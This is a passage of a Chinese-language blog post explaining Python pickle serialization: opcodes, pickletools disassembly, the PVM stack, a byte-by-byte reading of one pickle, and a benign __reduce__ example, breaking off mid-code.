class="built_in">print</span>(pickle.dumps(Demo(<span class="string">&#x27;test1&#x27;</span>)))</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(Demo2()))</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(Demo2(<span class="string">&#x27;test123456&#x27;</span>)))</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(Demo3(<span class="string">&#x27;test&#x27;</span>, <span class="number">12</span>)))</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[+]序列化</span><br><span class="line">b&#x27;\x80\x04\x95+\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04Demo\x94\x93\x94)\x81\x94&#125;\x94\x8c\x04name\x94\x8c\x05demo1\x94sb.&#x27;</span><br><span class="line">b&#x27;\x80\x04\x95+\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04Demo\x94\x93\x94)\x81\x94&#125;\x94\x8c\x04name\x94\x8c\x05test1\x94sb.&#x27;</span><br><span class="line">b&#x27;\x80\x04\x95,\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x05Demo2\x94\x93\x94)\x81\x94&#125;\x94\x8c\x04name\x94\x8c\x05demo2\x94sb.&#x27;</span><br><span class="line">b&#x27;\x80\x04\x951\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x05Demo2\x94\x93\x94)\x81\x94&#125;\x94\x8c\x04name\x94\x8c\ntest123456\x94sb.&#x27;</span><br><span class="line">b&#x27;\x80\x04\x954\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x05Demo3\x94\x93\x94)\x81\x94&#125;\x94(\x8c\x04name\x94\x8c\x04test\x94\x8c\x03age\x94K\x0cub.&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看出序列化之后的数据遵循一定格式，包含基本属性和类型，但不包含方法名（函数）。</p><h2 id="pickletools"><a class="markdownIt-Anchor" href="#pickletools"></a> pickletools</h2><p>格式化分析序列化数据。demo：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data=pickle.dumps(Demo3(<span class="string">&#x27;test&#x27;</span>, <span class="number">12</span>))</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">pickletools.dis(data)</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;\x80\x04\x954\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x05Demo3\x94\x93\x94)\x81\x94&#125;\x94(\x8c\x04name\x94\x8c\x04test\x94\x8c\x03age\x94K\x0cub.&#x27;</span><br><span class="line">0: \x80 PROTO      4</span><br><span class="line">2: \x95 FRAME      52</span><br><span class="line">11: \x8c SHORT_BINUNICODE &#x27;__main__&#x27;</span><br><span class="line">21: \x94 MEMOIZE    (as 0)</span><br><span class="line">22: \x8c SHORT_BINUNICODE &#x27;Demo3&#x27;</span><br><span class="line">29: \x94 MEMOIZE    (as 1)</span><br><span class="line">30: \x93 STACK_GLOBAL</span><br><span class="line">31: \x94 MEMOIZE    (as 2)</span><br><span class="line">32: )    EMPTY_TUPLE</span><br><span class="line">33: \x81 NEWOBJ</span><br><span class="line">34: \x94 MEMOIZE    (as 3)</span><br><span class="line">35: &#125;    EMPTY_DICT</span><br><span class="line">36: \x94 MEMOIZE    (as 4)</span><br><span class="line">37: (    MARK</span><br><span class="line">38: \x8c     SHORT_BINUNICODE &#x27;name&#x27;</span><br><span class="line">44: \x94     MEMOIZE    (as 5)</span><br><span class="line">45: \x8c     SHORT_BINUNICODE &#x27;test&#x27;</span><br><span class="line">51: \x94     MEMOIZE    (as 6)</span><br><span class="line">52: \x8c     SHORT_BINUNICODE &#x27;age&#x27;</span><br><span class="line">57: \x94     MEMOIZE    (as 7)</span><br><span class="line">58: K        BININT1    12</span><br><span class="line">60: u        SETITEMS   (MARK at 37)</span><br><span class="line">61: b    BUILD</span><br><span class="line">62: .    STOP</span><br><span class="line">highest protocol among opcodes = 4</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="pvm-解释器"><a class="markdownIt-Anchor" href="#pvm-解释器"></a> PVM 解释器</h2><p>PVM 由三个部分组成：</p><ul><li>指令处理器：从流中读取 opcode 和参数，并对其进行解释处理，重复直到遇到结束符（.）后停止，最终留在栈顶的值作为反序列化对象返回</li><li>栈区（stack）：临时存储数据、参数以及对象，在进出栈的过程中完成对字节流反序列化，在栈顶生成反序列话结果。Python List 实现。</li><li>标签区（memo）：为 PVM 提供数据存储。Python Dict 实现。</li></ul><p>opcode 含义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"># Pickle opcodes.  See pickletools.py <span class="keyword">for</span> extensive docs.  The listing</span><br><span class="line"><span class="meta"># here is in kind-of alphabetical order of 1-character pickle code.</span></span><br><span class="line"><span class="meta"># pickletools groups them by purpose.</span></span><br><span class="line"></span><br><span class="line">MARK           = b<span class="number">&#x27;</span>(<span class="string">&#x27;   # push special markobject on stack</span></span><br><span class="line"><span class="string">STOP           = b&#x27;</span><span class="number">.&#x27;</span>   <span class="meta"># every pickle ends with STOP</span></span><br><span class="line">POP            = b<span class="number">&#x27;0&#x27;</span>   <span class="meta"># discard topmost stack item</span></span><br><span class="line">POP_MARK       = b<span class="number">&#x27;1&#x27;</span>   <span class="meta"># discard stack top through topmost markobject</span></span><br><span class="line">DUP            = b<span class="number">&#x27;2&#x27;</span>   <span class="meta"># duplicate top stack item</span></span><br><span class="line">FLOAT          = b<span class="number">&#x27;F</span><span class="number">&#x27;</span>   <span class="meta"># push float object; decimal string argument</span></span><br><span class="line">INT            = b<span class="number">&#x27;</span>I<span class="number">&#x27;</span>   <span class="meta"># push integer or bool; decimal string argument</span></span><br><span class="line">BININT         = b<span class="number">&#x27;</span>J<span class="number">&#x27;</span>   <span class="meta"># push four-byte signed int</span></span><br><span class="line">BININT1        = b<span class="number">&#x27;</span>K<span class="number">&#x27;</span>   <span class="meta"># push 1-byte unsigned int</span></span><br><span class="line">LONG           = b<span class="number">&#x27;L</span><span class="number">&#x27;</span>   <span class="meta"># push long; decimal string argument</span></span><br><span class="line">BININT2        = b<span class="number">&#x27;</span>M<span class="number">&#x27;</span>   <span class="meta"># push 2-byte unsigned int</span></span><br><span class="line">NONE           = b<span class="number">&#x27;</span>N<span class="number">&#x27;</span>   <span class="meta"># push None</span></span><br><span class="line">PERSID         = b<span class="number">&#x27;</span>P<span class="number">&#x27;</span>   <span class="meta"># push persistent object; id is taken from string arg</span></span><br><span class="line">BINPERSID      = b<span class="number">&#x27;</span>Q<span class="number">&#x27;</span>   #  <span class="string">&quot;       &quot;</span>         <span class="string">&quot;  ;  &quot;</span>  <span class="string">&quot;   &quot;</span>     <span class="string">&quot;  stack</span></span><br><span class="line"><span class="string">REDUCE         = b&#x27;R&#x27;   # apply callable to argtuple, both on stack</span></span><br><span class="line"><span class="string">STRING         = b&#x27;S&#x27;   # push string; NL-terminated string argument</span></span><br><span class="line"><span class="string">BINSTRING      = b&#x27;T&#x27;   # push string; counted binary string argument</span></span><br><span class="line"><span class="string">SHORT_BINSTRING= b&#x27;U&#x27;   #  &quot;</span>     <span class="string">&quot;   ;    &quot;</span>      <span class="string">&quot;       &quot;</span>      <span class="string">&quot; &lt; 256 bytes</span></span><br><span class="line"><span class="string">UNICODE        = b&#x27;V&#x27;   # push Unicode string; raw-unicode-escaped&#x27;d argument</span></span><br><span class="line"><span class="string">BINUNICODE     = b&#x27;X&#x27;   #   &quot;</span>     <span class="string">&quot;       &quot;</span>  ; counted UTF<span class="number">-8</span> <span class="built_in">string</span> argument</span><br><span class="line">APPEND         = b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>   <span class="meta"># append stack top to list below it</span></span><br><span class="line">BUILD          = b<span class="number">&#x27;b</span><span class="number">&#x27;</span>   <span class="meta"># call __setstate__ or __dict__.update()</span></span><br><span class="line">GLOBAL         = b<span class="number">&#x27;</span>c<span class="number">&#x27;</span>   <span class="meta"># push self.find_class(modname, name); 2 string args</span></span><br><span class="line">DICT           = b<span class="number">&#x27;</span>d<span class="number">&#x27;</span>   <span class="meta"># build a dict from stack items</span></span><br><span class="line">EMPTY_DICT     = b<span class="number">&#x27;</span>&#125;<span class="string">&#x27;   # push empty dict</span></span><br><span class="line"><span class="string">APPENDS        = b&#x27;</span>e<span class="number">&#x27;</span>   <span class="meta"># extend list on stack by topmost stack slice</span></span><br><span class="line">GET            = b<span class="number">&#x27;</span>g<span class="number">&#x27;</span>   <span class="meta"># push item from memo on stack; index is string arg</span></span><br><span class="line">BINGET         = b<span class="number">&#x27;</span>h<span class="number">&#x27;</span>   #   <span class="string">&quot;    &quot;</span>    <span class="string">&quot;    &quot;</span>   <span class="string">&quot;   &quot;</span>  ;   <span class="string">&quot;    &quot;</span> <span class="number">1</span>-byte arg</span><br><span class="line">INST           = b<span class="number">&#x27;</span>i<span class="number">&#x27;</span>   <span class="meta"># build &amp; push class instance</span></span><br><span class="line">LONG_BINGET    = b<span class="number">&#x27;</span>j<span class="number">&#x27;</span>   <span class="meta"># push item from memo on stack; index is 4-byte arg</span></span><br><span class="line">LIST           = b<span class="number">&#x27;l</span><span class="number">&#x27;</span>   <span class="meta"># build list from topmost stack items</span></span><br><span class="line">EMPTY_LIST     = b<span class="number">&#x27;</span>]<span class="string">&#x27;   # push empty list</span></span><br><span class="line"><span class="string">OBJ            = b&#x27;</span>o<span class="number">&#x27;</span>   <span class="meta"># build &amp; push class instance</span></span><br><span class="line">PUT            = b<span class="number">&#x27;</span>p<span class="number">&#x27;</span>   <span class="meta"># store stack top in memo; index is string arg</span></span><br><span class="line">BINPUT         = b<span class="number">&#x27;</span>q<span class="number">&#x27;</span>   #   <span class="string">&quot;     &quot;</span>    <span class="string">&quot;   &quot;</span>   <span class="string">&quot; ;   &quot;</span>    <span class="string">&quot; 1-byte arg</span></span><br><span class="line"><span class="string">LONG_BINPUT    = b&#x27;r&#x27;   #   &quot;</span>     <span class="string">&quot;    &quot;</span>   <span class="string">&quot;   &quot;</span> ;   <span class="string">&quot;    &quot;</span> <span class="number">4</span>-byte arg</span><br><span class="line">SETITEM        = b<span class="number">&#x27;</span>s<span class="number">&#x27;</span>   <span class="meta"># add key+value pair to dict</span></span><br><span class="line">TUPLE          = b<span class="number">&#x27;</span>t<span class="number">&#x27;</span>   <span class="meta"># build tuple from topmost stack items</span></span><br><span class="line">EMPTY_TUPLE    = b<span class="number">&#x27;</span>)<span class="string">&#x27;   # push empty tuple</span></span><br><span class="line"><span class="string">SETITEMS       = b&#x27;</span><span class="string">u&#x27;   # modify dict by adding topmost key+value pairs</span></span><br><span class="line"><span class="string">BINFLOAT       = b&#x27;</span>G<span class="number">&#x27;</span>   <span class="meta"># push float; arg is 8-byte float encoding</span></span><br><span class="line"></span><br><span class="line">TRUE           = b<span class="number">&#x27;</span>I01\n<span class="number">&#x27;</span>  <span class="meta"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line">FALSE          = b<span class="number">&#x27;</span>I00\n<span class="number">&#x27;</span>  <span class="meta"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line"></span><br><span class="line"># Protocol <span class="number">2</span></span><br><span class="line"></span><br><span class="line">PROTO          = b<span class="number">&#x27;</span>\x80<span class="number">&#x27;</span>  <span class="meta"># identify pickle protocol</span></span><br><span class="line">NEWOBJ         = b<span class="number">&#x27;</span>\x81<span class="number">&#x27;</span>  <span class="meta"># build object by applying cls.__new__ to argtuple</span></span><br><span class="line">EXT1           = b<span class="number">&#x27;</span>\x82<span class="number">&#x27;</span>  <span class="meta"># push object from extension registry; 1-byte index</span></span><br><span class="line">EXT2           = b<span class="number">&#x27;</span>\x83<span class="number">&#x27;</span>  <span class="meta"># ditto, but 2-byte index</span></span><br><span class="line">EXT4           = b<span class="number">&#x27;</span>\x84<span class="number">&#x27;</span>  <span class="meta"># ditto, but 4-byte index</span></span><br><span class="line">TUPLE1         = b<span class="number">&#x27;</span>\x85<span class="number">&#x27;</span>  <span class="meta"># build 1-tuple from stack top</span></span><br><span class="line">TUPLE2         = b<span class="number">&#x27;</span>\x86<span class="number">&#x27;</span>  <span class="meta"># build 2-tuple from two topmost stack items</span></span><br><span class="line">TUPLE3         = b<span class="number">&#x27;</span>\x87<span class="number">&#x27;</span>  <span class="meta"># build 3-tuple from three topmost stack items</span></span><br><span class="line">NEWTRUE        = b<span class="number">&#x27;</span>\x88<span class="number">&#x27;</span>  <span class="meta"># push True</span></span><br><span class="line">NEWFALSE       = b<span class="number">&#x27;</span>\x89<span class="number">&#x27;</span>  <span class="meta"># push False</span></span><br><span class="line">LONG1          = b<span class="number">&#x27;</span>\x8a<span class="number">&#x27;</span>  <span class="meta"># push long from &lt; 256 bytes</span></span><br><span class="line">LONG4          = b<span class="number">&#x27;</span>\x8b<span class="number">&#x27;</span>  <span class="meta"># push really big long</span></span><br><span class="line"></span><br><span class="line">_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]</span><br><span class="line"></span><br><span class="line"># Protocol <span class="number">3</span> (Python <span class="number">3.</span>x)</span><br><span class="line"></span><br><span class="line">BINBYTES       = b<span class="number">&#x27;B</span><span class="number">&#x27;</span>   <span class="meta"># push bytes; counted binary string argument</span></span><br><span class="line">SHORT_BINBYTES = b<span class="number">&#x27;</span>C<span class="number">&#x27;</span>   #  <span class="string">&quot;     &quot;</span>   ;    <span class="string">&quot;      &quot;</span>       <span class="string">&quot;      &quot;</span> &lt; <span class="number">256</span> bytes</span><br><span class="line"></span><br><span class="line"># Protocol <span class="number">4</span></span><br><span class="line"></span><br><span class="line">SHORT_BINUNICODE = b<span class="number">&#x27;</span>\x8c<span class="number">&#x27;</span>  <span class="meta"># push short string; UTF-8 length &lt; 256 bytes</span></span><br><span class="line">BINUNICODE8      = b<span class="number">&#x27;</span>\x8d<span class="number">&#x27;</span>  <span class="meta"># push very long string</span></span><br><span class="line">BINBYTES8        = b<span class="number">&#x27;</span>\x8e<span class="number">&#x27;</span>  <span class="meta"># push very long bytes string</span></span><br><span class="line">EMPTY_SET        = b<span class="number">&#x27;</span>\x8f<span class="number">&#x27;</span>  <span class="meta"># push empty set on the stack</span></span><br><span class="line">ADDITEMS         = b<span class="number">&#x27;</span>\x90<span class="number">&#x27;</span>  <span class="meta"># modify set by adding topmost stack items</span></span><br><span class="line">FROZENSET        = b<span class="number">&#x27;</span>\x91<span class="number">&#x27;</span>  <span class="meta"># build frozenset from topmost stack items</span></span><br><span class="line">NEWOBJ_EX        = b<span class="number">&#x27;</span>\x92<span class="number">&#x27;</span>  <span class="meta"># like NEWOBJ but work with keyword only arguments</span></span><br><span class="line">STACK_GLOBAL     = b<span class="number">&#x27;</span>\x93<span class="number">&#x27;</span>  <span class="meta"># same as GLOBAL but using names on the stacks</span></span><br><span class="line">MEMOIZE          = b<span class="number">&#x27;</span>\x94<span class="number">&#x27;</span>  <span class="meta"># store top of the stack in memo</span></span><br><span class="line">FRAME            = b<span class="number">&#x27;</span>\x95<span class="number">&#x27;</span>  <span class="meta"># indicate the beginning of a new frame</span></span><br><span class="line"></span><br><span class="line"># Protocol <span class="number">5</span></span><br><span class="line"></span><br><span class="line">BYTEARRAY8       = b<span class="number">&#x27;</span>\x96<span class="number">&#x27;</span>  <span class="meta"># push bytearray</span></span><br><span class="line">NEXT_BUFFER      = b<span class="number">&#x27;</span>\x97<span class="number">&#x27;</span>  <span class="meta"># push next out-of-band buffer</span></span><br><span class="line">READONLY_BUFFER  = b<span class="number">&#x27;</span>\x98<span class="number">&#x27;</span>  <span class="meta"># make top of stack readonly</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>总共 5 个版本，每个版本向下兼容。</p><h2 id="逐-byte-分析"><a class="markdownIt-Anchor" href="#逐-byte-分析"></a> 逐 byte 分析</h2><p>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span>:</span><br><span class="line">    name = <span class="string">&quot;aaaaa&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name=<span class="string">&#x27;demo1&#x27;</span></span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = <span class="number">19</span></span><br><span class="line">        self.study = [<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>]</span><br><span class="line"></span><br><span class="line">demo = Demo(<span class="string">&#x27;testdemo&#x27;</span>)</span><br><span class="line">bdemo = pickle.dumps(demo)</span><br><span class="line">bdemo = pickletools.optimize(bdemo) <span class="comment"># 优化序列化数据，删除不必要的操作符</span></span><br><span class="line"><span class="built_in">print</span>(bdemo)</span><br><span class="line">pickletools.dis(bdemo)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;\x80\x04\x95B\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x8c\x04Demo\x93)\x81&#125;(\x8c\x04name\x8c\x08testdemo\x8c\x03ageK\x13\x8c\x05study](\x8c\x01a\x8c\x01b\x8c\x01ceub.&#x27;</span><br><span class="line">0: \x80 PROTO      4</span><br><span class="line">2: \x95 FRAME      66</span><br><span class="line">11: \x8c SHORT_BINUNICODE &#x27;__main__&#x27;</span><br><span class="line">21: \x8c SHORT_BINUNICODE &#x27;Demo&#x27;</span><br><span class="line">27: \x93 STACK_GLOBAL</span><br><span class="line">28: )    EMPTY_TUPLE</span><br><span class="line">29: \x81 NEWOBJ</span><br><span class="line">30: &#125;    EMPTY_DICT</span><br><span class="line">31: (    MARK</span><br><span class="line">32: \x8c     SHORT_BINUNICODE &#x27;name&#x27;</span><br><span class="line">38: \x8c     SHORT_BINUNICODE &#x27;testdemo&#x27;</span><br><span class="line">48: \x8c     SHORT_BINUNICODE &#x27;age&#x27;</span><br><span class="line">53: K        BININT1    19</span><br><span class="line">55: \x8c     SHORT_BINUNICODE &#x27;study&#x27;</span><br><span class="line">62: ]        EMPTY_LIST</span><br><span class="line">63: (        MARK</span><br><span class="line">64: \x8c         SHORT_BINUNICODE &#x27;a&#x27;</span><br><span class="line">67: \x8c         SHORT_BINUNICODE &#x27;b&#x27;</span><br><span class="line">70: \x8c         SHORT_BINUNICODE &#x27;c&#x27;</span><br><span class="line">73: e            APPENDS    (MARK at 63)</span><br><span class="line">74: u        SETITEMS   (MARK at 31)</span><br><span class="line">75: b    BUILD</span><br><span class="line">76: .    STOP</span><br><span class="line">highest protocol among opcodes = 4</span><br></pre></td></tr></table></figure><ul><li>\x80\x04<ul><li>\x80 PROTO 协议版本 4</li></ul></li><li>\x95B\x00\x00\x00\x00\x00\x00\x00<ul><li>\95 FRAME 帧 由此八个字节表示共有几个字节</li><li>这里 B 是 66（16 进制 acsii，小端存储），66+8 字节长度+2 字节协议版本，所以该字节流共 76 字节</li></ul></li><li>\x8c\x08<strong>main</strong><ul><li>\x8c short string 短字符串</li><li>\x08 字符串长为 8 len(&quot;<strong>main</strong>&quot;)=8，</li><li><strong>main</strong>可以理解成默认包名</li></ul></li><li>\x8c\x04Demo<ul><li>\x8c short string 短字符串</li><li>串长 4</li><li>Demo 类名</li></ul></li><li>\x93<ul><li>\x93 STACK_GLOBAL 将<strong>main</strong>.Demo 入栈</li></ul></li><li>）<ul><li>EMPTY_TUPLE 申明空元组，入栈</li></ul></li><li>\x81<ul><li>NEWOBJ 构建对象，通过 cls.<strong>new</strong>的参数元组，此时是空对象，入栈</li></ul></li><li>}<ul><li>EMPTY_DICT 申明空字典，预备为对象赋值，入栈</li></ul></li><li>(<ul><li>MARK 对原有栈进行封存，声明一个新的栈</li></ul></li><li>\x8c\x04name<ul><li>SHORT_BINUNICODE 'name'，入栈</li></ul></li><li>\x8c\x08testdemo<ul><li>SHORT_BINUNICODE 'testdemo'，入栈</li></ul></li><li>\x8c\x03age<ul><li>SHORT_BINUNICODE 'age'，入栈</li></ul></li><li>K\x13<ul><li>K BININT1</li><li>\x13 16 进制的 19，入栈</li></ul></li><li>\x8c\x05study<ul><li>SHORT_BINUNICODE 'study'，入栈</li></ul></li><li>]<ul><li>EMPTY_LIST，声明一个新的列表，入栈</li></ul></li><li>(<ul><li>MARK 封存当前栈，声明一个新的栈</li></ul></li><li>\x8c\x01a<ul><li>SHORT_BINUNICODE 'a'，入栈</li></ul></li><li>\x8c\x01b<ul><li>SHORT_BINUNICODE 'b'，入栈</li></ul></li><li>\x8c\x01c<ul><li>SHORT_BINUNICODE 'c'，入栈</li></ul></li><li>e<ul><li>APPENDS (MARK at 63)，将 'a'，'b'，'c'追加到 list 中并出栈，该栈清空回到上一栈</li></ul></li><li>u<ul><li>SETITEMS (MARK at 31)，将&quot;name&quot;:'testdemo','age':19, 'study':['a'，'b'，'c']三组键值对赋值给空字典，该栈清空回到上一栈</li></ul></li><li>b<ul><li>BUILD call <strong>setstate</strong> or <strong>dict</strong>.update()，将字典的值赋给空对象，至此对象有了属性，栈顶就是该对象</li></ul></li><li>.<ul><li>STOP</li></ul></li></ul><h2 id="反序列化"><a class="markdownIt-Anchor" href="#反序列化"></a> 反序列化</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">demo = Demo(<span class="string">&#x27;testdemo&#x27;</span>)</span><br><span class="line">bdemo = pickle.dumps(demo)</span><br><span class="line">bdemo = pickletools.optimize(bdemo)</span><br><span class="line"><span class="built_in">print</span>(bdemo)</span><br><span class="line">obj=pickle.loads(bdemo)</span><br><span class="line"><span class="built_in">print</span>(obj)</span><br><span class="line"><span class="built_in">print</span>(obj.name)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;\x80\x04\x95B\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x8c\x04Demo\x93)\x81&#125;(\x8c\x04name\x8c\x08testdemo\x8c\x03ageK\x13\x8c\x05study](\x8c\x01a\x8c\x01b\x8c\x01ceub.&#x27;</span><br><span class="line">&lt;__main__.Demo object at 0x000001DBE4358DF0&gt;</span><br><span class="line">testdemo</span><br></pre></td></tr></table></figure><h2 id="命名空间"><a class="markdownIt-Anchor" href="#命名空间"></a> 命名空间</h2><p>反序列化必须要在当前的运行空间中有相应的类，现在根据对象 testdemo 的序列化字节流进行以下操作：</p><ul><li>注释掉类声明可以看到以下报错：<ul><li>AttributeError: Can't get attribute 'Demo' on &lt;module '<strong>main</strong>' from 'D:/PycharmProjects/unserialize_py/main.py'&gt;</li></ul></li><li>将其他 class 的名字改成 Demo：<ul><li>正确被反序列化</li></ul></li></ul><h2 id="reduce"><a class="markdownIt-Anchor" href="#reduce"></a> <strong>reduce</strong></h2><p>在序列化中如果对象中包含文件属性，则不可以序列化，会存在报错。TypeError: cannot pickle '_io.BufferedWriter' object代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, file_path=<span class="string">&quot;0.txt&quot;</span>, name=<span class="string">&#x27;123&#x27;</span></span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.file_path = file_path</span><br><span class="line">        self.openfile = <span class="built_in">open</span>(self.file_path, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line"></span><br><span class="line">my_test=test(<span class="string">&quot;1.txt&quot;</span>,<span class="string">&quot;aaaaa&quot;</span>)</span><br><span class="line">saved_obj=pickle.dumps(my_test)</span><br></pre></td></tr></table></figure><p>_io.BufferedWriter 对象无法被序列化，如果依旧像序列化 test 对象，可以使用<strong>reduce</strong>方法:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, file_path=<span class="string">&quot;0.txt&quot;</span>, name=<span class="string">&#x27;123&#x27;</span></span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.file_path = file_path</span><br><span class="line">        self.openfile = <span class="built_in">open</span>(self.file_path, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.__class__, (self.file_path, self.name)</span><br><span class="line"></span><br><span class="line">my_test = test(<span class="string">&quot;1.txt&quot;</span>, <span class="string">&quot;aaaaa&quot;</span>)</span><br><span class="line">saved_obj = pickle.dumps(my_test)</span><br><span class="line">optdata=pickletools.optimize(saved_obj)</span><br><span class="line"><span class="built_in">print</span>(optdata)</span><br><span class="line">pickletools.dis(optdata)</span><br><span class="line">obj=pickle.loads(optdata)</span><br><span class="line"><span class="built_in">print</span>(obj.name)</span><br><span class="line"><span 